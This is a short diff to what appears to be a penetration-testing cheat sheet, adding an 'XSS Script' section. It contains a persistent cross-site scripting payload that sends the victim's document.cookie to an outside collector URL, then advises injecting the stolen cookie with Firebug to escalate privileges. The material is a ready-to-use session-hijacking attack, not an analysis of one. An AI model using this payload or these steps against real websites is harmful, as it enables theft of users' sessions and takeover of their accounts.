@@ -287,9 +287,17 @@ mysql -u userName -pPassword -h HOSTIP DBName
 
 
 
+&nbsp;
+### XSS Script 
+
+- Test all the fields for vulnerability &nbsp; | &nbsp; Reflected XSS
+
+- Persistent XSS :
+	
+	<script> var i = new Image(); i.src="http://URL/get.php?cookie="+escape(document.cookie)</script>
 
 
-
+- Use Firebug to inject the cookie and elevate 
 
 
 &nbsp;
